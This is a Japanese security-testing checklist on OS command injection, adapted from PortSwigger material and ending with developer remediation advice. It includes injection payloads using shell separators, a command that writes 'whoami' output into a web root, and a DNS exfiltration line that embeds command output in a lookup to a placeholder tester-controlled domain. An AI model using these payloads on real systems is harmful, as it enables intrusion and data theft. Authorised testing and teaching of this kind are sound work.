# OSコマンドインジェクション 診断チェックリスト

PortSwigger Web Security Academy の解説を読み、診断の手順として組み直したノートです。原文は転載していません。詳しい説明や演習は出典を見てください。

診断は、自分の管理下の環境か、書面で許可を得た対象にだけ行います。対象サーバーでコマンドが実際に実行されるため、ファイルの削除・変更・外部への通信を伴うコマンドは特に慎重に扱う。

## 1. 疑う場所

アプリがサーバー側で、OSのシェルコマンドを呼び出している箇所。レガシーなツールやスクリプトとの連携(社内の古いシステム、レポート生成、メール送信、画像/動画変換、ping・pathへの到達確認など)で、ユーザー入力をコマンドの引数として渡している実装。

**シェル経由かどうかを最初に見分ける**: コマンド区切り文字(`&`、`;`など、3章)が効くのは、アプリが文字列をシェル(`/bin/sh`、`cmd.exe`など)に渡して解釈させている場合。言語の`exec()`系APIで、引数を配列としてプログラムに直接渡している(シェルを介さない)実装では、区切り文字は単なる引数の一部になり、通常は効かない。この場合でも、2つの別の経路が残る。

- **引数・オプションインジェクション**: ユーザー入力が、先頭に`-`を付けた形でコマンドのオプションとして解釈され、対象プログラムの意図しない機能(別ファイルの読み込みなど)を呼び出せる場合がある。
- 対象プログラム自体に、OSコマンドインジェクションにつながる既知の脆弱性がある場合。

## 2. 結果が見える場合(応答に出る)

1. 無害な文字列を出力させるコマンド(`echo`など)を、コマンドの区切り文字(3章)と組み合わせて注入する。例: `& echo aiwefwlguh &`
2. 注入した文字列が応答に出れば、コマンドが実行されている。
3. 元のコマンド名の後に続けて区切り文字を置くと、注入したコマンドが、後続の本来の引数から隔離される(後続の引数がエラーになっても、注入したコマンドの実行自体は成立する)。

確認が取れたら、調査用の基本コマンドを実行する。

| 目的 | Linux | Windows |
|---|---|---|
| 現在のユーザー名 | `whoami` | `whoami` |
| OS情報 | `uname -a` | `ver` |
| ネットワーク設定 | `ifconfig` | `ipconfig /all` |
| ネットワーク接続状況 | `netstat -an` | `netstat -an` |
| 実行中プロセス | `ps -ef` | `tasklist` |

## 3. コマンドの区切り方

入力がどこに入るか(引用符の中かどうか)によって、使える記号が変わる。

| 記号 | Windows | Unix系 |
|---|---|---|
| `&` | 使える | 使える |
| `&&` | 使える | 使える |
| `\|` | 使える | 使える |
| `\|\|` | 使える | 使える |
| `;` | 使えない | 使える |
| 改行(`\n`) | 使えない | 使える |
| バックティック(`` `コマンド` ``) | 使えない | 使える(インライン実行) |
| `$(コマンド)` | 使えない | 使える(インライン実行) |

`&`/`&&`/`|`/`||`は同義ではない。`&`は前のコマンドの成否に関わらず次を実行、`&&`は前が成功した場合のみ、`|`は前の出力を次に渡す(パイプ)、`||`は前が失敗した場合のみ実行する。元のコマンドの実行結果に影響を与えにくい記号(通常`&`)を優先して使う。また、`cmd.exe`とPowerShellでも解釈が異なるので、同じWindowsでも対象シェルを確認する。

記号ごとに微妙に挙動が違い、結果が応答に出せるか(インバンド)、ブラインドでしか使えないかに差が出ることがある。1つの記号で通らなければ他の記号を試す。入力が引用符(`"`や`'`)の中に入っている場合は、まず引用符を閉じてから区切り記号を使う必要がある。`echo`での検出(2章)も、この引用符・コンテキストを踏まえて組み立てる(闇雲に`& echo ... &`を送るのではなく、入力が置かれている文脈に合わせる)。

## 4. 結果が見えない場合(ブラインド)

応答にコマンドの出力が出ない実装(メール送信処理の裏でコマンドを呼んでいるなど)でも、次の手口で検出・悪用できる。

### 4-1. 時間差での検出

`ping`のように、送信するパケット数を指定できるコマンドで、応答時間に差をつける。例: `& ping -c 10 127.0.0.1 &`(ループバックへ10秒分pingする)。基準の応答時間と比較して、明確な遅延が出れば注入が成立している。

### 4-2. 出力のリダイレクトでの取得

Webサーバーが静的ファイルを配信しているディレクトリが分かれば、コマンドの出力をそこに書き出し、あとでブラウザから取得する。例: `& whoami > /var/www/static/whoami.txt &` のあと、`https://target/whoami.txt` にアクセスして内容を確認する。

### 4-3. OAST(外部通信)での検出・データ持ち出し

自分の管理するドメインへのDNSルックアップを起こすコマンド(`nslookup`など)で検出する。例: `& nslookup 自分のドメイン &`。

コマンドの実行結果をそのままサブドメインに埋め込めば、DNSの着信ログから直接値が読める。例: `` & nslookup `whoami`.自分のドメイン & ``(`whoami`の結果がサブドメインとして着信する)。

## 5. 誤検知・見落としやすい点

- `echo`で文字列が出ても、それが注入コマンドの実行結果か、単に入力値がそのままエコーバックされただけかを区別する(無害な文字列を使い、元の入力とは別の値であることを確認する)。
- 時間差の検出は、ネットワークのゆらぎと区別するため、注入前の基準応答時間を複数回測ってから比較する。
- OASTでDNSの着信だけでHTTPの着信がない場合、ネットワークレベルのフィルタで止まっている可能性がある(SSRFと同様)。コマンド自体は実行されている可能性が残る。
- 区切り文字が1つ通らなくても、OSの種類(Windows/Unix)によって使える記号が異なるので、対象OSを把握してから適切な記号を選ぶ。
- 出力のリダイレクト(4-2)は、Webルートのパスが分かっている必要がある。パスが不明な場合は、他のブラインド手口(時間差、OAST)を優先する。

## 6. 対策(開発側への指摘事項)

- アプリケーション層からOSコマンドを呼び出す実装そのものを避ける。多くの場合、同じ機能を安全なプラットフォームAPI(言語・フレームワークが提供する関数)で実現できる。
- どうしてもOSコマンドを呼ぶ必要がある場合、ユーザー入力は厳格に検証する。許可する値の許可リスト、数値のみであることの確認、英数字のみに限定する、といった方式を使う。
- シェルのメタ文字をエスケープして無害化する方式には頼らない。実装の誤りや想定外の回避方法が生まれやすく、安全性の保証が難しい。
